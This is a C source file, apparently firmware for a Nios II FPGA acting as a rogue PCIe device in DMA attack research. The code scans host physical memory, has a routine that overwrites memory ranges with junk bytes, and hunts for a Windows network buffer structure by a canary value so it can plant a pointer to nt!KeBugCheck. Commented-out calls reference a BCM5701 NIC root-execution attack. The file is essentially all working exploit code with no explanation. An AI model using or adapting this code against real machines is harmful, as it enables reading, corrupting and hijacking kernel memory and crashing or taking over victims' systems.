#include <stdio.h>
#include <unistd.h>
#include <stdint.h>

#include "iownmmu/BCM5701/mbuf.h"
#include "iownmmu/BCM5701/attack.h"
#include "iownmmu/rw.h"
#include "sys/alt_timestamp.h"
#include "pcie-backend.h"
#include "iownmmu/windows/canary.h"

void scan_memory_status(uint64_t addr_start, uint64_t addr_end)
{
  uint64_t addr=0;
  uint32_t length=0;
  char page[4096];

  for (addr=addr_start; addr < addr_end; addr += 4096LL)
  {
    if ((addr & 0x3FFFF) == 0)
    {
      uint32_t h=0, l=0;
      h = (addr >> 32LL);
      l = (addr & 0xFFFFFFFFLL); 
      printf("\n0x%08x_%08x:", h, l);
    }
//    int32_t ret = 0;
    int32_t ret = memory_read(addr, 8, page, 1000, &length);
    char rv = '0' + (char) ret;
    putchar(rv);
//    usleep(1000000);
  }
} 

void corrupt_memory(uint64_t addr_start, uint64_t addr_end)
{
  uint64_t addr=0;
  uint32_t length=0;
  char page[4096];
  memset(page, 0x5a, sizeof(page));

  for (addr=addr_start; addr < addr_end; addr += 4096LL)
  {
    if ((addr & 0x3FFFF) == 0)
    {
      uint32_t h=0, l=0;
      h = (addr >> 32LL);
      l = (addr & 0xFFFFFFFFLL); 
      printf("\n0x%08x_%08x:", h, l);
    }
    write_buffer(addr, 32, page);
    char rv = 'w';
    putchar(rv);
//    usleep(1000000);
  }
} 

int main() {
  char buf[4096];
  uint64_t addr=0;
  printf("Hello from Nios II!\n");
  usleep(2*1000*1000);
  printf("Starting...\n");
  alt_timestamp_start();
  printf("Draining PCIe core\n");
  drain_pcie_core();
  printf("Drain done\n");


//  for (addr=0LL; addr < 0x400000000; addr += 4096)
      

//  BCM5701_own(0, root_execute_15_5_0);
//  scan_memory_status(0x0LL, 0x1000000000LL);
//  corrupt_memory(0x0LL, 0x400000000LL);

  // from debugger:
//  uint64_t canary_base = 0x1aa5e4000LL;
  uint64_t canary_base = 0x100000000LL;
  uint64_t canary_searchlen = 0x400000000LL;
//  uint32_t canary = 0x0;
  uint32_t canary = 0x00220015LL;
//  uint64_t canary = 0x20000104
  int64_t canary_delta = -0x40LL;
  uint64_t payload = 0xfffff802a6d75fb0LL; /* payload=nt!KeBugCheck */ 
  
  uint64_t canary_offset = 0xc60LL + 0xC0LL; // offset within page to look for canary: 0xc60 is base of NBL, add 0xc0 for flags offset

//  scan_memory_canary(0x0LL, 0x400000000LL, 0x00220015 /* canary */, -0x40LL /* offset */,
//    );

//  scan_memory_canary(canary_base, canary_base+canary_searchlen, canary, canary_delta, canary_offset,
//    payload);

  check_memory_canary(canary_base, canary_base+canary_searchlen,
    canary, canary_offset, canary_delta,
    payload);
    
  return 0;
}
